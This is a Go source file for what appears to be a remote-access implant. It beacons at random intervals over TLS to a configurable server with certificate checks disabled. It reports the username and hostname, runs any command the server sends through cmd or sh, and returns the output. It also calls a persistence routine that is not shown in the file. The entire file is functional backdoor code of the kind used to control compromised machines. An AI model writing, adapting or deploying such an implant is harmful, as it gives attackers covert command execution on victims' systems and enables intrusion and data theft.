package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

var (
	serverAddr = flag.String("addr", "localhost:8080", "Server address")
	AgentID    = "dev-agent-001"
	ServerAddr = "localhost:8080"
)

func main() {
	flag.Parse()
	if *serverAddr != "localhost:8080" {
		ServerAddr = *serverAddr
	}
	persist()
	for {
		n := 8 + rand.Intn(5)
		hostname, err := os.Hostname()
		if err != nil {
			log.Printf("failed to get hostname: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}
		currentUser, err := user.Current()
		if err != nil {
			log.Printf("failed to get current user: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}

		conn, err := tls.Dial("tcp", ServerAddr, &tls.Config{InsecureSkipVerify: true})
		if err != nil {
			log.Printf("failed to connect to server: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}

		message := fmt.Sprintf("%s:%s:%s\n", AgentID, currentUser.Username, hostname)
		_, err = conn.Write([]byte(message))
		if err != nil {
			log.Printf("failed to send message: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}

		reader := bufio.NewReader(conn)
		response, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("failed to read response: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}
		if strings.HasPrefix(response, "ACK:") {
			log.Printf("beacon acknowledged")
		} else {
			var cmd *exec.Cmd
			if runtime.GOOS == "windows" {
				cmd = exec.Command("cmd", "/C", strings.TrimSpace(response))
			} else {
				cmd = exec.Command("sh", "-c", strings.TrimSpace(response))
			}
			output, err := cmd.CombinedOutput()
			if err != nil {
				log.Printf("failed to execute command: %v", err)
				time.Sleep(time.Duration(n) * time.Second)
				continue
			}
			log.Printf("command output: %s", output)
			flat := strings.ReplaceAll(string(output), "\n", " ")
			conn.Write([]byte(flat + "\n"))

		}
		conn.Close()
		time.Sleep(time.Duration(n) * time.Second)
	}
}
